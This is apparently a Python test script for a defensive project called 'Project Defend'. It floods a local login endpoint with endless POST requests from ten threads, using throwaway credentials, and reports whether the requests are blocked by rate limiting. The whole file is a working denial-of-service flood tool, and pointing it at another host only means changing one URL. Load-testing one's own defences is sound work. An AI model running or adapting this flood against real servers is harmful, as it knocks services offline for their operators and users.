import requests
import time
import threading

# Target Configuration
TARGET_URL = "http://127.0.0.1:8081/users/login"
DRY_RUN = False # Set to True to only simulate without sending

def attack_worker(worker_id):
    """Sends rapid-fire requests to overwhelm the server."""
    print(f"[*] Worker {worker_id} started...")
    while True:
        try:
            # We don't even need real credentials for a DoS, we just need high traffic!
            payload = {"email": f"bot_{worker_id}@attack.com", "password": "any"}
            response = requests.post(TARGET_URL, json=payload, timeout=1)
            
            if response.status_code == 429 or response.status_code == 403:
                 print(f"[!] Worker {worker_id}: 🛑 ATTACK BLOCKED BY AI AGENT (Status: {response.status_code})")
                 time.sleep(1) # Slow down if blocked
            else:
                 print(f"[+] Worker {worker_id}: Request sent (Status: {response.status_code})")
                 
        except Exception as e:
            # If the server crashes or times out, we've succeeded in DoS!
            print(f"[!] Worker {worker_id}: Server unresponsive / Connection Error")
            time.sleep(1)

def main():
    print("=" * 60)
    print("🔥 PROJECT DEFEND ATTACK SIMULATOR - DOS EDITION (FLOOD)")
    print("=" * 60)
    print(f"Targeting: {TARGET_URL}")
    print("Initiating flooding attack with 10 concurrent workers...")
    print("WARNING: This will generate high CPU usage on the server.")
    print("=" * 60)
    
    threads = []
    for i in range(10): # 10 flooding threads
        t = threading.Thread(target=attack_worker, args=(i,))
        t.daemon = True # Close when main closes
        threads.append(t)
        t.start()
        
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n\n[!] DOS Attack stopped by user.")

if __name__ == "__main__":
    main()
